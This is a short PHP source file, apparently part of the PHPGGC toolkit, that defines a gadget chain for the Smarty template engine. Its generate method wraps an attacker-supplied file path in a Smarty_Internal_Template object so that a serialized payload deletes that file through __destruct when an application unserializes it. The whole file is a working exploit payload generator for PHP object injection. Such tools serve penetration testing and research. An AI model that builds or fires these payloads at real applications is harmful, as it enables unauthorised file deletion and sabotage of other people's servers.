<?php

namespace GadgetChain\Smarty;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '?';
    public static $vector = '__destruct';
    public static $author = 'd3adc0de';
    public static $parameters = [
        'remote_file'
    ];

    public function generate(array $parameters)
    {
        return new \Smarty_Internal_Template($parameters['remote_file']);
    }
}